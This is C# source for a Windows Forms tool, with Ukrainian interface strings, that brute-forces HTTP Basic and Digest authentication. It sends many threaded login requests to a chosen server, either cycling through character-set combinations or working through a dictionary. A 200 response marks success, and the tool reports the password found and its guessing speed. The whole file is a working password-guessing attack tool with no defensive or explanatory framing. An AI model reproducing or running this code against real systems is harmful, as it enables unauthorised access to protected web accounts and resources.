using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Threading;
using System.Collections;


namespace ZI
{
    public partial class Form1 : Form
    {

        int procs = 0;
        string pass = null;
        string curpass = "";
        int curpassi = 0;
        int passn = 0;
        bool Flg;
        bool FPaus;
        bool FDig;
        Thread[] thrs;
        Thread bgthr;
       
        ReaderWriterLock rwl = new ReaderWriterLock();
        ReaderWriterLock prwl = new ReaderWriterLock();

        public Form1()
        {
            Form.CheckForIllegalCrossThreadCalls = false;
            InitializeComponent();
        }

        public string CreateNonce()
        {
            string rand = RandomString(10);
            return (Convert.ToBase64String(Encoding.UTF8.GetBytes(rand)));
        }

        private string RandomString(int size)
        {
            StringBuilder builder = new StringBuilder();
            Random random = new Random();
            char ch;
            for (int i = 0; i < size; i++)
            {
                ch = Convert.ToChar(Convert.ToInt32(Math.Floor(26 * random.NextDouble() + 65)));
                builder.Append(ch);
            }
            return builder.ToString();
        }

        public string CreateCNonce()
        {
            string rand = RandomString(10);
            Byte[] bytes = Encoding.UTF8.GetBytes(rand);
            return ToHex(bytes);
        }

        public string ToHex(byte[] inputBytes)
        {
            StringBuilder str = new StringBuilder();
            foreach (byte b in inputBytes)
            {
                str.Append(String.Format("{0:x2}", b));
            }
            return str.ToString();
        }

        public string GenerateDigest(string username, string password, string realm, string uri, string nonce, string cnonce, string qop, string nc)
        {
            MD5 md5 = MD5.Create();

            // A1 = User:Realm:Password
            StringBuilder A1 = new StringBuilder();
            A1.Append(username);
            A1.Append(":");
            A1.Append(realm);
            A1.Append(":");
            A1.Append(password);
            byte[] bytesA1 = Encoding.UTF8.GetBytes(A1.ToString());
            byte[] bytesMD5Hash = md5.ComputeHash(bytesA1);
            string H1 = ToHex(bytesMD5Hash);

            // A2 = Method/URI
            StringBuilder A2 = new StringBuilder();
            A2.Append("GET");
            A2.Append(":");
            A2.Append(uri);
            byte[] bytesA2 = Encoding.UTF8.GetBytes(A2.ToString());
            byte[] bytesA2MD5Hash = md5.ComputeHash(bytesA2);
            string H2 = ToHex(bytesA2MD5Hash);

            // A3 = H1 + ":" + nonce + ":" + nc + ":" + cnonce + ":" + qop + ":" + H2
            StringBuilder A3 = new StringBuilder();
            A3.Append(H1);
            A3.Append(":");
            A3.Append(nonce);
            A3.Append(":");
            A3.Append(nc);
            A3.Append(":");
            A3.Append(cnonce);
            A3.Append(":");
            A3.Append(qop);
            A3.Append(":");
            A3.Append(H2);
            byte[] bytesA3 = Encoding.UTF8.GetBytes(A3.ToString());
            byte[] bytesA3MD5Hash = md5.ComputeHash(bytesA3);

            return ToHex(bytesA3MD5Hash);
        }

        public string GenerateHeader(string username, string realm, string nonce, string uri, string qop, string nc, string cnonce, string digest)
        {
            return string.Format("Authorization: Digest username=\"{0}\", realm=\"{1}\", nonce=\"{2}\", uri=\"{3}\", algorithm=MD5, qop=\"{4}\", nc={5}, cnonce=\"{6}\", response=\"{7}\"",username, realm, nonce, uri, qop, nc, cnonce, digest);
        }

        byte[] AuthRequest(string uri, string host, string login, string pass)
        {
            string authstr = login + ":" + pass;
            byte[] pbuf = new byte[authstr.Length];
            for (int i = 0; i < authstr.Length; ++i)
            {
                pbuf[i] = (byte)authstr[i];
            }
            int pcount = authstr.Length;
            byte[] buf = new byte[1024];
            string req = "GET " + uri + " HTTP/1.1\r\nHost: " + host + "\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAuthorization: Basic ";
            int ti = 0;
            for (int i = 0; i < req.Length; ++i, ++ti)
            {
                buf[ti] = (byte)req[i];
            }
            ti += Encode(pbuf, pcount, buf, ti);
            req = "\r\n\r\n";
            for (int i = 0; i < req.Length; ++i, ++ti)
            {
                buf[ti] = (byte)req[i];
            }
            return buf;
        }




        int Encode(byte[] inputBytes, int inputsize, byte[] outputBytes, int outpoffs)
        {
            ToBase64Transform base64Transform = new ToBase64Transform();
           // Verify that multiple blocks can not be transformed.
            if (!base64Transform.CanTransformMultipleBlocks)
            {
                // Initializie the offset size.
                int inputOffset = 0;

                // Iterate through inputBytes transforming by blockSize.
                int inputBlockSize = base64Transform.InputBlockSize;

                while (inputsize - inputOffset > inputBlockSize)
                {
                    outpoffs += base64Transform.TransformBlock(
                        inputBytes,
                        inputOffset,
                        inputBytes.Length - inputOffset,
                        outputBytes,
                        outpoffs);

                    inputOffset += base64Transform.InputBlockSize;
                }

            // Transform the final block of data.
            byte[] final = base64Transform.TransformFinalBlock(
                    inputBytes,
                    inputOffset,
                    inputsize - inputOffset);
            for (int i = 0; i < final.Length; ++i, ++outpoffs)
            {
                outputBytes[outpoffs] = final[i];
            }

        }

        // Determine if the current transform can be reused.
        if (! base64Transform.CanReuseTransform)
        {
            // Free up any used resources.
            base64Transform.Clear();
        }

        return outpoffs;

    }

        int DeEncode(byte[] inputBytes, int inputsize, byte[] outputBytes, int outpoffs)
        {
            FromBase64Transform base64Transform = new FromBase64Transform();
            // Verify that multiple blocks can not be transformed.
            if (!base64Transform.CanTransformMultipleBlocks)
            {
                // Initializie the offset size.
                int inputOffset = 0;

                // Iterate through inputBytes transforming by blockSize.
                int inputBlockSize = base64Transform.InputBlockSize;

                while (inputsize - inputOffset > inputBlockSize)
                {
                    outpoffs += base64Transform.TransformBlock(
                        inputBytes,
                        inputOffset,
                        inputBytes.Length - inputOffset,
                        outputBytes,
                        outpoffs);

                    inputOffset += base64Transform.InputBlockSize;
                }

                // Transform the final block of data.
                byte[] final = base64Transform.TransformFinalBlock(
                        inputBytes,
                        inputOffset,
                        inputsize - inputOffset);
                for (int i = 0; i < final.Length; ++i, ++outpoffs)
                {
                    outputBytes[outpoffs] = final[i];
                }

            }

            // Determine if the current transform can be reused.
            if (!base64Transform.CanReuseTransform)
            {
                // Free up any used resources.
                base64Transform.Clear();
            }

            return outpoffs;

        }

        byte[] NonAuthRequest(string uri, string host)
        {
            byte[] buf = new byte[1024];
            string req = "GET " + uri + " HTTP/1.1\r\nHost: " + host + "\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\n\r\n";
            int ti = 0;
            for (int i = 0; i < req.Length; ++i, ++ti)
            {
                buf[ti] = (byte)req[i];
            }
            return buf;
        }

        string NextPass(string s)
        {
            string str = "";
            int i;
            bool f = true;
            for (i = s.Length - 1; i >= 0 ; --i)
            {
                if (f)
                {
                    if (s[i] == tSyms.Text[tSyms.Text.Length - 1])
                    {
                        str = tSyms.Text[0] + str;
                    }
                    else
                    {
                        int p = tSyms.Text.IndexOf(s[i]);
                        str = tSyms.Text[p + 1] + str;
                        f = false;
                    }
                }
                else
                {
                    str = s[i] + str;
                }
            }
            if (f)
            {
                str = tSyms.Text[0] + str;
            }
            return str;
        }


        void StartPr()
        {
            procs = 0;
            pass = null;
            DateTime dtst = DateTime.Now;
            Start.Enabled = false;
            string pwd = "";
            string npwd = tPwd1.Text;
            string spass = null;
            int pwdc = 0;
            bool fend = false;
            Flg = false;
            Stop.Enabled = true;
            FPaus = false;
            Pause.Enabled = true;
            TimeSpan dl;
            do
            {
                rwl.AcquireWriterLock(-1);
                ++procs;
                rwl.ReleaseWriterLock();
                Thread thr = new Thread(new ParameterizedThreadStart(StartProc));
                thr.IsBackground = true;
                thr.Start(new Proc(tUri.Text, tHost.Text, tlogin.Text, pwd, tServer.Text, tPort.Text));
                pwd = npwd;
                lpwdc.Text = (++pwdc).ToString();
                lPwd.Text = pwd;
                dl = DateTime.Now - dtst;
                if (dl.Seconds > 0)
                {
                    lSpeed.Text = (pwdc / (int)dl.TotalSeconds).ToString() + " паролів/с";
                }
                tTime.Text = dl.Hours.ToString() + ":" + dl.Minutes.ToString() + ":" + dl.Seconds.ToString() + "." + dl.Milliseconds.ToString();
                while (true)
                {
                    bool f = false;
                    rwl.AcquireReaderLock(-1);
                    if (procs < udPrc.Value || pass != null)
                    {
                        if (pass != null)
                        {
                            spass = pass;
                        }
                        f = true;
                    }
                    fend = Flg;
                    rwl.ReleaseReaderLock();
                    if (f && !FPaus)
                    {
                        break;
                    }
                    if (fend)
                    {
                        Start.Enabled = true;
                        Pause.Enabled = false;
                        Stop.Enabled = false;
                        return;
                    }
                    dl = DateTime.Now - dtst;
                    tTime.Text = dl.Hours.ToString() + ":" + dl.Minutes.ToString() + ":" + dl.Seconds.ToString() + "." + dl.Milliseconds.ToString();
                    Thread.Sleep(100);
                }
                if (spass != null)
                {
                    break;
                }
                npwd = NextPass(pwd);
            }
            while (pwd != tPwd2.Text);

            while (true)
            {
                bool f = false;
                rwl.AcquireReaderLock(-1);
                if (procs == 0)
                {
                    f = true;
                }
                if (pass != null)
                {
                    spass = pass;
                }
                fend = Flg;
                rwl.ReleaseReaderLock();
                if (fend)
                {
                    Start.Enabled = true;
                    Pause.Enabled = false;
                    Stop.Enabled = false;
                    return;
                }
                if (f && !FPaus)
                { break; }
                dl = DateTime.Now - dtst;
                tTime.Text = dl.Hours.ToString() + ":" + dl.Minutes.ToString() + ":" + dl.Seconds.ToString() + "." + dl.Milliseconds.ToString();
                Thread.Sleep(100);
            }
            if (spass == null)
            {
                tResult.Text = "Пароль не знайдено";
            }
            else if (spass == "")
            {
                tResult.Text = "Паролю немає";
            }
            else
            {
                tResult.Text = spass;
            }
            MessageBox.Show("Підбір закінчено", "Інформація", MessageBoxButtons.OK, MessageBoxIcon.Information, MessageBoxDefaultButton.Button1, MessageBoxOptions.ServiceNotification);
            Start.Enabled = true;
            Stop.Enabled = false;
            Pause.Enabled = false;
            Flg = false;
            FPaus = false;
        }

        void StartPrDict()
        {
            procs = 0;
            pass = null;
            DateTime dtst = DateTime.Now;
            Start.Enabled = false;
            string spass = null;
            int pwdc = 0;
            bool fend = false;
            Flg = false;
            Stop.Enabled = true;
            FPaus = false;
            Pause.Enabled = true;
            TimeSpan dl = new TimeSpan();

            {
                string pwd = "";
                rwl.AcquireWriterLock(-1);
                ++procs;
                rwl.ReleaseWriterLock();
                Thread thr = new Thread(new ParameterizedThreadStart(StartProc));
                thr.IsBackground = true;
                thr.Start(new Proc(tUri.Text, tHost.Text, tlogin.Text, pwd, tServer.Text, tPort.Text));
                lpwdc.Text = (++pwdc).ToString();
                lPwd.Text = pwd;
                dl = DateTime.Now - dtst;
                if (dl.Seconds > 0)
                {
                    lSpeed.Text = (pwdc / (int)dl.TotalSeconds).ToString() + " паролів/с";
                }
                dl = DateTime.Now - dtst;
                tTime.Text = dl.Hours.ToString() + ":" + dl.Minutes.ToString() + ":" + dl.Seconds.ToString() + "." + dl.Milliseconds.ToString();
                while (true)
                {
                    bool f = false;
                    rwl.AcquireReaderLock(-1);
                    if (procs < udPrc.Value || pass != null)
                    {
                        if (pass != null)
                        {
                            spass = pass;
                        }
                        f = true;
                    }
                    fend = Flg;
                    rwl.ReleaseReaderLock();
                    if (f && !FPaus)
                    {
                        break;
                    }
                    if (fend)
                    {
                        Start.Enabled = true;
                        Stop.Enabled = false;
                        Pause.Enabled = false;
                        return;
                    }
                    dl = DateTime.Now - dtst;
                    tTime.Text = dl.Hours.ToString() + ":" + dl.Minutes.ToString() + ":" + dl.Seconds.ToString() + "." + dl.Milliseconds.ToString();
                    Thread.Sleep(100);
                }
            }

            if (spass == null)
            {
                foreach (string pwd in dict.Lines)
                {
                    rwl.AcquireWriterLock(-1);
                    ++procs;
                    rwl.ReleaseWriterLock();
                    Thread thr = new Thread(new ParameterizedThreadStart(StartProc));
                    thr.IsBackground = true;
                    thr.Start(new Proc(tUri.Text, tHost.Text, tlogin.Text, pwd, tServer.Text, tPort.Text));
                    lpwdc.Text = (++pwdc).ToString();
                    lPwd.Text = pwd;
                    dl = DateTime.Now - dtst;
                    if (dl.Seconds > 0)
                    {
                        lSpeed.Text = (pwdc / (int)dl.TotalSeconds).ToString() + " паролів/с";
                    }
                    dl = DateTime.Now - dtst;
                    tTime.Text = dl.Hours.ToString() + ":" + dl.Minutes.ToString() + ":" + dl.Seconds.ToString() + "." + dl.Milliseconds.ToString();
                    while (true)
                    {
                        bool f = false;
                        rwl.AcquireReaderLock(-1);
                        if (procs < udPrc.Value || pass != null)
                        {
                            if (pass != null)
                            {
                                spass = pass;
                            }
                            f = true;
                        }
                        fend = Flg;
                        rwl.ReleaseReaderLock();
                        if (f && !FPaus)
                        {
                            break;
                        }
                        if (fend)
                        {
                            Start.Enabled = true;
                            Stop.Enabled = false;
                            Pause.Enabled = false;
                            return;
                        }
                        dl = DateTime.Now - dtst;
                        tTime.Text = dl.Hours.ToString() + ":" + dl.Minutes.ToString() + ":" + dl.Seconds.ToString() + "." + dl.Milliseconds.ToString();
                        Thread.Sleep(100);
                    }
                    if (spass != null)
                    {
                        break;
                    }
                }
            }

            while (true)
            {
                bool f = false;
                rwl.AcquireReaderLock(-1);
                if (procs == 0)
                {
                    f = true;
                }
                if (pass != null)
                {
                    spass = pass;
                }
                fend = Flg;
                rwl.ReleaseReaderLock();
                if (fend)
                {
                    Start.Enabled = true;
                    Stop.Enabled = false;
                    Pause.Enabled = false;
                    return;
                }
                if (f && !FPaus)
                { break; }
                tTime.Text = dl.Hours.ToString() + ":" + dl.Minutes.ToString() + ":" + dl.Seconds.ToString() + "." + dl.Milliseconds.ToString();
                Thread.Sleep(100);
            }
            if (spass == null)
            {
                tResult.Text = "Пароль не знайдено";
            }
            else if (spass == "")
            {
                tResult.Text = "Паролю немає";
            }
            else
            {
                tResult.Text = spass;
            }
            MessageBox.Show("Підбір закінчено", "Інформація", MessageBoxButtons.OK, MessageBoxIcon.Information, MessageBoxDefaultButton.Button1, MessageBoxOptions.ServiceNotification);
            Start.Enabled = true;
            Stop.Enabled = false;
            Pause.Enabled = false;
            Flg = false;
            FPaus = false;
        }

        private void Start_Click(object sender, EventArgs e)
        {
            Start.Enabled = false;
            if (FPaus)
            {
                if (FDig)
                {
                    foreach (Thread thr in thrs)
                    {
                        thr.Resume();
                    }
                }
                Pause.Enabled = true;
                Stop.Enabled = true;
            }
            else
            {
                FDig = usedig.Checked;
                if (!FDig)
                {
                    Thread thr;
                    if (usdic.Checked)
                    {
                        thr = new Thread(new ThreadStart(StartPrDict));
                    }
                    else
                    {
                        thr = new Thread(new ThreadStart(StartPr));
                    }
                    thr.IsBackground = true;
                    thr.Start();
                }
                else
                {
                    StartDigPr();
                }
            }
            FPaus = false;
        }

        void StartProc(object p)
        {
            Proc pr = p as Proc;
            string xpass = null;

            Socket s = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            IPAddress ip = Dns.GetHostByName(pr.server).AddressList[0];
            int port = int.Parse(pr.port);
            IPEndPoint ipe = new IPEndPoint(ip, port);
            s.Connect(ipe);
            byte[] buf;
            if (pr.pass == "")
            {
                buf = NonAuthRequest(pr.uri, pr.host);
            }
            else
            {
                buf = AuthRequest(pr.uri, pr.host, pr.login, pr.pass);
            }
            s.Send(buf);
            byte[] rbuf = new byte[1024];
            int rs = s.Receive(rbuf);
            string text = "";
            for (int i = 0; i < rs; ++i)
            {
                text += (char)rbuf[i];
            }
            s.Close();

            string[] strs = text.Split(" \r\n\t".ToCharArray(), StringSplitOptions.RemoveEmptyEntries);
            int code;
            if (int.TryParse(strs[1], out code))
            {
                if (code == 200)
                {
                    xpass = pr.pass;
                }
                else if (code == 401)
                {
                }
            }


            rwl.AcquireWriterLock(-1);
            if ((xpass != null) && (pass == null) || (xpass == ""))
            {
                pass = xpass;
            }
            --procs;
            rwl.ReleaseWriterLock();
        }

        byte[] AuthDigRequest(string user, string pwd, string realm, string nonce, string uri, string qop, string nc, string host)
        {
            string cnonce = CreateCNonce();
            string s = GenerateHeader(user, realm, nonce, uri, qop, nc, cnonce, GenerateDigest(user, pwd, realm, uri, nonce, cnonce, qop, nc));

            
            string req = "GET " + uri + " HTTP/1.1\r\nHost: " + host + "\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\n" + s + "\r\n\r\n";
            byte[] buf = new byte[1024];
            for (int i = 0; i < req.Length; ++i)
            {
                buf[i] = (byte)req[i];
            }
            return buf;
        }

        int RecognizeReply(string s, out string realm, out string nonce, out string qop)
        {
            string[] strs = s.Split("\r\n".ToCharArray(), StringSplitOptions.RemoveEmptyEntries);
            int code;
            int.TryParse(strs[0].Split(" \t".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)[1], out code);
            if (code == 401)
            {
                string[] xstrs = null;
                foreach (string str in strs)
                {
                    xstrs = str.Split(" ,\t".ToCharArray(), StringSplitOptions.RemoveEmptyEntries);
                    if((xstrs[0] == "WWW-Authenticate:") && (xstrs[1] == "Digest"))
                    {
                        break;
                    }
                }

                if ((xstrs[0] == "WWW-Authenticate:") && (xstrs[1] == "Digest"))
                {
                    Hashtable dict = new Hashtable();
                    for (int i = 2; i < xstrs.Length; ++i)
                    {
                        string xs = xstrs[i];
                        int p = xs.IndexOf('=');
                        if (p > 0)
                        {
                            dict.Add(xs.Substring(0, p), xs.Substring(p + 1));
                        }
                    }

                    realm = dict["realm"].ToString().Replace("\"", "");
                    nonce = dict["nonce"].ToString().Replace("\"", "");
                    qop = dict["qop"].ToString().Replace("\"", "");
                }
                else
                {
                    realm = "";
                    nonce = "";
                    qop = "";
                }
            }
            else 
            {
                realm = "";
                nonce = "";
                qop = "";
            }

            return code;

        }

        string GeneratePass()
        {
            string s;
            prwl.AcquireWriterLock(-1);
            if (pass == null)
            {
                if (usdic.Checked)
                {
                    if (curpassi >= dict.Lines.Length)
                    {
                        s = null;
                    }
                    else
                    {
                        s = dict.Lines[curpassi++];
                        ++passn;
                    }
                }
                else
                {
                    if (curpass == tPwd2.Text)
                    {
                        s = null;
                    }
                    else
                    {
                        s = curpass = NextPass(curpass);
                        ++passn;
                    }
                }
            }
            else
            {
                s = null;
            }
            prwl.ReleaseWriterLock();
            return s;
        }

        void StartDigProc(object p)
        {
            Proc pr = p as Proc;
            string xpass = null;

            byte[] buf;
            string tpass = "";
            string realm = "";
            string nonce = "";
            string qop = "";

            do
            {
                Socket s = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                IPAddress ip = Dns.GetHostByName(pr.server).AddressList[0];
                int port = int.Parse(pr.port);
                IPEndPoint ipe = new IPEndPoint(ip, port);
                s.Connect(ipe);

                if (tpass == "")
                {
                    buf = NonAuthRequest(pr.uri, pr.host);
                }
                else
                {
                    buf = AuthDigRequest(pr.login, tpass, realm, nonce, pr.uri, qop, "00000001", pr.host);
                }
                s.Send(buf);
                byte[] rbuf = new byte[1024];
                int rs = s.Receive(rbuf);
                string text = "";
                for (int i = 0; i < rs; ++i)
                {
                    text += (char)rbuf[i];
                }
                int code = RecognizeReply(text, out realm, out nonce, out qop);

                if (code == 200)
                {
                    xpass = tpass;
                    break;
                }

                s.Close();

                if (FPaus)
                {
                    Thread.CurrentThread.Suspend();
                }

                if (Flg)
                {
                    break;
                }

            } while ((tpass = GeneratePass()) != null);

            if ((xpass != null) && (pass == null) || (xpass == ""))
            {
                pass = xpass;
            }

        }

        void BgThr()
        {
            DateTime dtst = DateTime.Now;
            TimeSpan dl;

            bool cont = true;

            while (cont)
            {
                cont = false;
                foreach (Thread t in thrs)
                {
                    if (t.IsAlive)
                    {
                        cont = true;
                        break;
                    }
                }


                dl = DateTime.Now - dtst;

                lpwdc.Text = (passn).ToString();
                lPwd.Text = curpass;
                dl = DateTime.Now - dtst;
                if (dl.Seconds > 0)
                {
                    lSpeed.Text = (passn / (int)dl.TotalSeconds).ToString() + " паролів/с";
                }
                tTime.Text = dl.Hours.ToString() + ":" + dl.Minutes.ToString() + ":" + dl.Seconds.ToString() + "." + dl.Milliseconds.ToString();


                Thread.Sleep(100);

            }

            if (!Flg)
            {
                if (pass == null)
                {
                    tResult.Text = "Пароль не знайдено";
                }
                else if (pass == "")
                {
                    tResult.Text = "Паролю немає";
                }
                else
                {
                    tResult.Text = pass;
                }
                MessageBox.Show("Підбір закінчено", "Інформація", MessageBoxButtons.OK, MessageBoxIcon.Information, MessageBoxDefaultButton.Button1, MessageBoxOptions.ServiceNotification);
            }
            Start.Enabled = true;
            Stop.Enabled = false;
            Pause.Enabled = false;
            FPaus = false;
            Flg = false;
        }

        void StartDigPr()
        {
            passn = 0;
            pass = null;
            curpass = tPwd1.Text;
            curpassi = 0;
            Start.Enabled = false;
            Flg = false;
            Stop.Enabled = true;
            FPaus = false;
            Pause.Enabled = true;
            

            int thrc = (int)udPrc.Value;
            thrs = new Thread[thrc];

            for (int i = 0; i < thrc; ++i)
            {
                thrs[i] = new Thread(new ParameterizedThreadStart(StartDigProc));
                thrs[i].IsBackground = true;
                thrs[i].Start(new Proc(tUri.Text, tHost.Text, tlogin.Text, "", tServer.Text, tPort.Text));
            }

            bgthr = new Thread(new ThreadStart(BgThr));
            bgthr.IsBackground = true;
            bgthr.Start();
        }

   
        
        private void Form1_Load(object sender, EventArgs e)
        {
            
        }

        private void listen_Click(object sender, EventArgs e)
        {
            
        }

        private void tPwd1_TextChanged(object sender, EventArgs e)
        {

        }

        private void Stop_Click(object sender, EventArgs e)
        {
            rwl.AcquireWriterLock(-1);
            Flg = true;
            rwl.ReleaseWriterLock();
        }

        private void usdic_CheckedChanged(object sender, EventArgs e)
        {
            dict.ReadOnly = !usdic.Checked;
        }

        private void dict_TextChanged(object sender, EventArgs e)
        {
            lpcount.Text = dict.Lines.Length.ToString();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            FPaus = true;
            Pause.Enabled = false;
            Stop.Enabled = false;
            Start.Enabled = true;
        }

    }
}

